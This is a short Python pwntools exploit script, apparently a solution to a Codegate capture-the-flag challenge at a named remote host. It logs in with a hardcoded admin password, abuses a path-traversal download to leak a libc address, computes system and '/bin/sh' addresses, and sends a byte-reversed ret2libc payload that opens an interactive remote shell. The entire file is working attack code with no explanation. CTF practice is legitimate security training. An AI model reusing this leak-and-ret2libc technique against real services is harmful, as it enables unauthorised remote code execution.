from pwn import *

def join(ID, pw, name, age):
	r.send(p32(1))
	print r.recvuntil("Name:")
	r.sendline(name)
	print r.recvuntil("Age:")
	r.sendline(str(age))
	print r.recvuntil("ID:")
	r.sendline(ID)
	print r.recvuntil("PW:")
	r.sendline(pw)
	print r.recvuntil("Choice:")

def login(ID, pw):
	r.send(p32(3))
	print r.recvuntil("id:")
	r.sendline(ID)
	print r.recvuntil("pw:")
	r.sendline(pw)
	print r.recvuntil("Choice:")

def download(URL):
	r.send(p32(8))
	r.send(p32(1))
	r.sendline(URL)

r = remote("ch41l3ng3s.codegate.kr", 2121)

print r.recvuntil("Choice:")

join("asdf", "asdf", "asdf", 10)
login("admin", "P3ssw0rd")

download("/../bb/../")

libc = u32(r.recvuntil("/")[-4:][::-1])
libc_base = libc - 0x5fa2f
system = libc_base + 0x3a940
binsh = libc_base + 0x15902b

for i in range(0x2e):
	login("admin", "P3ssw0rd") # login cnt=0x2f now!

payload = "/../../cccccccc" # reverse input
payload += p32(binsh)[::-1]
payload += "AAAA"
payload += p32(system)[::-1]

download(payload)

r.interactive()
